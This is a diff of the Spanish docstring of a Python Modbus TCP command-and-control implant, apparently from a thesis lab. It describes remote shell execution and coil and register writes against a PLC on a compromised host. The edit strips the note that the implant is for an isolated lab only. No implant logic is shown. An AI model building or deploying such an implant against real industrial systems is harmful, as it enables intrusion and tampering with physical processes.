@@ -1,26 +1,11 @@
 #!/usr/bin/env python3
-"""
-Implante C2 encubierto sobre Modbus TCP — componente víctima.
+"""Implante del C2 Modbus: polling del PLC-buzón, ejecución de opcodes
+(shell / write_coil / write_register / exit) y publicación de respuesta.
 
-Script AUTOCONTENIDO que se despliega en la máquina comprometida
-(srv_empresa, nodered_scada, o cualquier host con Python3 + pymodbus).
-NO depende del framework de ataques del toolkit — usa pymodbus
-directamente para ser portable.
+Script autocontenido (solo pymodbus); se despliega vía SCP en el host
+comprometido. Uso directo:
 
-Hace polling periódico del PLC-buzón (holding registers zona CMD).
-Cuando detecta un comando nuevo (magic=0xC2C2 + seq nuevo):
-  - opcode 0x01 (shell): ejecuta el payload como comando de sistema.
-  - opcode 0x02 (write_coil): escritura Modbus FC=5 contra el PLC víctima.
-  - opcode 0x03 (write_register): escritura Modbus FC=6 contra el PLC víctima.
-  - opcode 0xFF (exit): se detiene.
-
-Publica la respuesta en la zona RSP del PLC-buzón.
-
-USO:
     python3 c2_modbus_implant.py --mailbox 192.168.10.11 --port 502 --poll 3
-
-SOLO para el laboratorio aislado del TFM. No contiene funcionalidad
-ofensiva real — es una prueba de concepto educativa.
 """
 
 import argparse
